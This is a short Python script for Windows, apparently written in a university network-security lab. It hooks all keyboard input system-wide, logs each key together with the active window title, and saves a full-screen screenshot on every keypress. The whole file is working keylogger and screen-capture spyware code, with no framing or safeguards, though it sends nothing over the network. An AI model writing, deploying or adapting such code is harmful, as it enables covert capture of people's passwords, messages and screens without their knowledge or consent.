import win32gui, win32api, win32ui, win32con
import pythoncom
import pyWinhook as pyHook
curWindow = None
num = 0

def getScreenshot():
    global num
    hwnd = win32gui.GetDesktopWindow()
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    height = 1080
    width = 1920
    print("height = ", height, "width = ", width)

    hDC = win32gui.GetWindowDC(hwnd)
    pDC = win32ui.CreateDCFromHandle(hDC)
    memDC = pDC.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(pDC, width, height)
    memDC.SelectObject(screenshot)

    memDC.BitBlt((0, 0), (width, height), pDC, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(memDC, 'D:/data/전북대학교/BCGlab/network/python/screenshot%d.bmp' %num)
    num += 1

    memDC.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def getCurProc ():
    global curWindow
    try:
        hwnd = win32gui.GetForegroundWindow()
        winTitle = win32gui.GetWindowText(hwnd)
        if winTitle != curWindow:
            curWindow = winTitle
            print('\n[%s]' %winTitle)
    except:
        print('\n[Unknown Window] ')
        pass

def OnKeyboardEvent(event):
    getCurProc()
    print("++ Key: ", event.Key, end="\n")
    getScreenshot()
    return True


def run():
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


def main():
    run()


main()
